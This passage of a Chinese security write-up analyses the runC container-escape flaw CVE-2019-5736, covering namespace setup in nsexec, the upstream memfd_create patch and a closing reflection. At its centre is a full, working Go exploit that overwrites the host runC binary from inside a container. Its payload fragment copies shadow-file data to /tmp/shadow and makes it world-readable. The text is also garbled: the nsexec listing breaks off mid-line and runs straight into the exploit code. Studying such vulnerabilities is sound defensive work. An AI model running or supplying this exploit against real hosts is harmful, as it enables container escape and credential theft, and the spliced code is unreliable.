    }
在接下来的过程中会调用该InitPath，并且参数为init，相当于执行了runC
init命令，在该命令中采用cgo的形式导入C语言nstnter进行命名空间的设置：
    package main
    import (
        "os"
        "runtime"
        "strconv"
        "github.com/opencontainers/runc/libcontainer"
        _ "github.com/opencontainers/runc/libcontainer/nsenter"
        "github.com/sirupsen/logrus"
    )
    ......
nsenter如下：
    package nsenter
    /*
    #cgo CFLAGS: -Wall
    extern void nsexec();
    void __attribute__((constructor)) init(void) {
        nsexec();
    }
    */
    import "C"
可以看到调用了nsexec()函数，该函数在go
runtime之前进行调用，函数的主要作用就是解析之前父进程发送的netlink格式的配置信息，然后通过设置usernamespace并创建子进程，然后子进程设置其他一些namespace并通过创建孙进程使相关namespaces生效，这个孙进程其实就是容器中的init进程，不过回想这个过程，runC通过cmd.Start()开启一个子进程执行runC
init，在runC init的nsenter包执行过程中，会首先设置自己的user namespace和pid
namespace，这就使得在该过程中容器内本身存在的进程可以发现runC进程，因此：
    void nsexec(void)
    {
        int pipenum;
        jmp_buf env;
        int syncpipe[2];
        struct nlconfig_t config = {0};
        /*
         * If we don't have an init pipe, just return to the go routine.
         * We'll only get an init pipe for start or exec.
         */
        pipenum = initpipe();
        if (pipenum == -1)
            return;
        /* Parse all of the netlink configuration. */
        nl_parse(pipenum, &config);
        /* clone(2) flags are mandatory. */
        if (config.cloneflags == -1)
            bail("missing clone_flags");
        /* Pipe so we can tell the child when we've finished setting up. */
        if (pipe(syncpipe)  /tmp/shadow && chmod 777 /tmp/shadow"
    func main() {
            // First we overwrite /bin/sh with the /proc/self/exe interpreter path
            fd, err := os.Create("/bin/sh")
            if err != nil {
                    fmt.Println(err)
                    return
            }
            fmt.Fprintln(fd, "#!/proc/self/exe")
            err = fd.Close()
            if err != nil {
                    fmt.Println(err)
                    return
            }
            fmt.Println("[+] Overwritten /bin/sh successfully")
            // Loop through all processes to find one whose cmdline includes runcinit
            // This will be the process created by runc
            var found int
            for found == 0 {
                    pids, err := ioutil.ReadDir("/proc")
                    if err != nil {
                            fmt.Println(err)
                            return
                    }
                    for _, f := range pids {
                            fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
                            fstring := string(fbytes)
                            if strings.Contains(fstring, "runc") {
                                    fmt.Println("[+] Found the PID:", f.Name())
                                    found, err = strconv.Atoi(f.Name())
                                    if err != nil {
                                            fmt.Println(err)
                                            return
                                    }
                            }
                    }
            }
            // We will use the pid to get a file handle for runc on the host.
            var handleFd = -1
            for handleFd == -1 {
                    // Note, you do not need to use the O_PATH flag for the exploit to work.
                    handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
                    if int(handle.Fd()) > 0 {
                            handleFd = int(handle.Fd())
                    }
            }
            fmt.Println("[+] Successfully got the file handle")
            // Now that we have the file handle, lets write to the runc binary and overwrite it
            // It will maintain it's executable flag
            for {
                    writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
                    if int(writeHandle.Fd()) > 0 {
                            fmt.Println("[+] Successfully got write handle", writeHandle)
                            writeHandle.Write([]byte(payload))
                            return
                    }
            }
    }
POC思路：
  1. 首先覆盖容器中的/bin/sh为#!/proc/self/exe。
  2. 遍历/proc下的目录找到runC相关进程
  3. 打开/proc下相关的exe文件获得fd
  4. 循环写入 fd，直到runC解除占用，成功写入
  5. runc最后将执行用户通过docker exec指定的/bin/sh，它的内容在第1步中已经被替换成#!/proc/self/exe，因此实际上将执行宿主机上的runc，而runc也已经在第4部中被我们覆盖掉了。
## 漏洞补丁
具体补丁详情：
    void nsexec(void)
    {
        int pipenum;
        @@ -549,6 +552,14 @@ void nsexec(void)
        if (pipenum == -1)
            return;
        /*
         * We need to re-exec if we are not in a cloned binary. This is necessary
         * to ensure that containers won't be able to access the host binary
         * through /proc/self/exe. See CVE-2019-5736.
         */
        if (ensure_cloned_binary() < 0)
            bail("could not ensure we are a cloned binary");
        /* Parse all of the netlink configuration. */
        nl_parse(pipenum, &config);
可以看到主要是增加了一个ensure_cloned_binary()函数的判断其中主要的逻辑是通过memfd_create来将让runc在容器内执行操作前首先将自己复制成为一个匿名文件，如此在可以达到原来效果的同时，/proc/self/exe无法触达到原本的
runC二进制文件。
## 思考
为了对容器进行有效控制通过宿主机进行容器内外的进程切换其实是必然的，但是稍有不慎就会导致容器信息外带在进程的上下文中，runC的这个漏洞是一个例子还有一个例子就是docker
cp漏洞，它本身也是因为docker-tar进程将相关的共享库内容外带到了宿主机导致了容器逃逸，因此在考虑容器安全问题时，对这些危险进程的监控也是十分必要的。
* * *